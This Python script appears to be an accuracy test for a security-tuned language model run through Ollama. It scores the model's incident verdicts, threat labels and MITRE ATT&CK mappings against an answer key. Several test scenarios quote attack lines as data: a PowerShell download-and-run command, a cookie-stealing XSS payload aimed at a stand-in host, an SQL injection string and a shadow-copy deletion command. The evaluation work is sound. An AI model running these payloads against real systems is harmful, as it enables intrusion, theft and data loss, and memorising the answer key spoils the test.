"""
Foundation-Sec-8B-Instruct accuracy test.

Three sections:
  1. Incident recognition (binary: incident vs benign)
  2. Threat-type classification (multi-class)
  3. MITRE ATT&CK technique mapping (technique ID + name)

Each case has a known answer. We send the prompt to Ollama, parse the
response, and score it. Final report is written to results.md.
"""

import json
import re
import time
import urllib.request

OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M"

# ---------- Test cases ----------

INCIDENT_CASES = [
    {
        "id": "INC-1",
        "scenario": "User logs in from their normal office IP at 9:02am on a workday and opens email.",
        "expected": "benign",
    },
    {
        "id": "INC-2",
        "scenario": "Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.",
        "expected": "incident",
    },
    {
        "id": "INC-3",
        "scenario": "Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.",
        "expected": "incident",
    },
    {
        "id": "INC-4",
        "scenario": "A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.",
        "expected": "benign",
    },
    {
        "id": "INC-5",
        "scenario": "EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')",
        "expected": "incident",
    },
    {
        "id": "INC-6",
        "scenario": "Developer pushes a commit to a feature branch, CI runs unit tests, all pass.",
        "expected": "benign",
    },
    {
        "id": "INC-7",
        "scenario": "DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.",
        "expected": "incident",
    },
]

THREAT_CASES = [
    {
        "id": "THR-1",
        "scenario": "Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.",
        "expected_keywords": ["ransomware"],
    },
    {
        "id": "THR-2",
        "scenario": "Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.",
        "expected_keywords": ["phishing", "bec", "business email compromise", "spear"],
    },
    {
        "id": "THR-3",
        "scenario": "Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.",
        "expected_keywords": ["sql injection", "sqli"],
    },
    {
        "id": "THR-4",
        "scenario": "A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.",
        "expected_keywords": ["xss", "cross-site scripting", "cross site scripting"],
    },
    {
        "id": "THR-5",
        "scenario": "Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.",
        "expected_keywords": ["credential", "credential dumping", "credential theft", "credential access", "lsass"],
    },
    {
        "id": "THR-6",
        "scenario": "Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.",
        "expected_keywords": ["ddos", "dos", "denial of service", "denial-of-service", "amplification"],
    },
    {
        "id": "THR-7",
        "scenario": "A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.",
        "expected_keywords": ["supply chain", "supply-chain"],
    },
]

# (id, scenario, expected technique IDs — any one match counts)
MITRE_CASES = [
    {
        "id": "ATT-1",
        "scenario": "An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.",
        "expected_ids": ["T1566.001", "T1566", "T1204.002", "T1204"],
    },
    {
        "id": "ATT-2",
        "scenario": "Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.",
        "expected_ids": ["T1003.001", "T1003"],
    },
    {
        "id": "ATT-3",
        "scenario": "Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.",
        "expected_ids": ["T1053.005", "T1053"],
    },
    {
        "id": "ATT-4",
        "scenario": "After initial access, the attacker uses 'net group \"Domain Admins\" /domain' and 'nltest /dclist' to map the AD environment.",
        "expected_ids": ["T1087.002", "T1087", "T1018", "T1482"],
    },
    {
        "id": "ATT-5",
        "scenario": "Adversary establishes persistence by adding a value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run that points to their malware.",
        "expected_ids": ["T1547.001", "T1547"],
    },
    {
        "id": "ATT-6",
        "scenario": "C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.",
        "expected_ids": ["T1071.004", "T1071", "T1048.003", "T1048"],
    },
    {
        "id": "ATT-7",
        "scenario": "Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.",
        "expected_ids": ["T1021.002", "T1021", "T1570", "T1569.002"],
    },
    {
        "id": "ATT-8",
        "scenario": "Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.",
        "expected_ids": ["T1490"],
    },
    {
        "id": "ATT-9",
        "scenario": "A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.",
        "expected_ids": ["T1027", "T1059.001", "T1140"],
    },
    {
        "id": "ATT-10",
        "scenario": "Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.",
        "expected_ids": ["T1560.001", "T1560"],
    },
]


# ---------- Ollama call ----------

def ask(prompt: str, system: str = "", timeout: int = 180) -> str:
    body = json.dumps({
        "model": MODEL,
        "prompt": prompt,
        "system": system,
        "stream": False,
        "options": {"temperature": 0.0, "num_predict": 400},
    }).encode()
    req = urllib.request.Request(OLLAMA_URL, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read())["response"].strip()


# ---------- Scoring ----------

def score_incident(reply: str, expected: str) -> bool:
    r = reply.lower()
    # Look at the first ~200 chars where the verdict is most likely stated.
    head = r[:300]
    if expected == "incident":
        positive = any(w in head for w in ["incident", "malicious", "suspicious", "compromise", "attack", "not benign"])
        negative = re.search(r"\bbenign\b|\bnot (an )?incident\b|\bnormal\b", head)
        return positive and not negative
    else:
        return ("benign" in head or "normal" in head or "not an incident" in head) and "incident" not in head.split("benign")[0] if "benign" in head else ("normal" in head or "not malicious" in head)


def score_threat(reply: str, keywords: list[str]) -> tuple[bool, str]:
    r = reply.lower()
    for kw in keywords:
        if kw in r:
            return True, kw
    return False, ""


def score_mitre(reply: str, expected_ids: list[str]) -> tuple[bool, str]:
    found = re.findall(r"T\d{4}(?:\.\d{3})?", reply)
    for f in found:
        if f in expected_ids:
            return True, f
    # also accept if any expected id appears as substring (model might write T1003.001)
    for eid in expected_ids:
        if eid in reply:
            return True, eid
    return False, ",".join(found) if found else "(none)"


# ---------- Run ----------

def main():
    out_lines = ["# Foundation-Sec-8B-Instruct evaluation\n"]
    out_lines.append(f"Model: `{MODEL}`\n")
    out_lines.append(f"Run started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    sys_prompt = "You are a cybersecurity analyst. Answer concisely and decisively."

    # 1. Incident recognition
    out_lines.append("\n## 1. Incident recognition (binary)\n")
    inc_correct = 0
    for c in INCIDENT_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Is this a security incident or benign activity? "
            "Reply with one word first ('Incident' or 'Benign'), then one sentence of justification."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok = score_incident(reply, c["expected"])
        inc_correct += int(ok)
        out_lines.append(
            f"\n### {c['id']} — expected: **{c['expected']}** — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    # 2. Threat classification
    out_lines.append(f"\n## 2. Threat-type classification\n")
    thr_correct = 0
    for c in THREAT_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Name the specific threat or attack type in 1-3 words, then briefly explain."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok, hit = score_threat(reply, c["expected_keywords"])
        thr_correct += int(ok)
        out_lines.append(
            f"\n### {c['id']} — accepted keywords: {c['expected_keywords']} — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
            + (f"\n_Match_: '{hit}'\n" if ok else "")
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    # 3. MITRE mapping
    out_lines.append(f"\n## 3. MITRE ATT&CK technique mapping\n")
    att_correct = 0
    for c in MITRE_CASES:
        prompt = (
            f"Scenario:\n{c['scenario']}\n\n"
            "Question: Which MITRE ATT&CK technique best matches this behavior? "
            "Reply with the technique ID (e.g. T1059.001) and the technique name."
        )
        t0 = time.time()
        try:
            reply = ask(prompt, sys_prompt)
        except Exception as e:
            reply = f"ERROR: {e}"
        dt = time.time() - t0
        ok, hit = score_mitre(reply, c["expected_ids"])
        att_correct += int(ok)
        out_lines.append(
            f"\n### {c['id']} — accepted IDs: {c['expected_ids']} — {'PASS' if ok else 'FAIL'} ({dt:.1f}s)\n"
            f"_Scenario_: {c['scenario']}\n\n"
            f"_Reply_: {reply}\n"
            f"\n_Detected IDs_: {hit}\n"
        )
        print(f"  {c['id']}: {'PASS' if ok else 'FAIL'} ({dt:.1f}s)")

    # Summary
    total = len(INCIDENT_CASES) + len(THREAT_CASES) + len(MITRE_CASES)
    correct = inc_correct + thr_correct + att_correct
    summary = (
        "\n## Summary\n\n"
        f"| Section | Correct | Total | Accuracy |\n"
        f"|---|---|---|---|\n"
        f"| Incident recognition | {inc_correct} | {len(INCIDENT_CASES)} | {inc_correct/len(INCIDENT_CASES):.0%} |\n"
        f"| Threat classification | {thr_correct} | {len(THREAT_CASES)} | {thr_correct/len(THREAT_CASES):.0%} |\n"
        f"| MITRE ATT&CK mapping | {att_correct} | {len(MITRE_CASES)} | {att_correct/len(MITRE_CASES):.0%} |\n"
        f"| **Overall** | **{correct}** | **{total}** | **{correct/total:.0%}** |\n"
    )
    out_lines.insert(3, summary)
    print(summary)

    with open("/home/explorer/sec_eval/results.md", "w") as f:
        f.write("".join(out_lines))


if __name__ == "__main__":
    main()
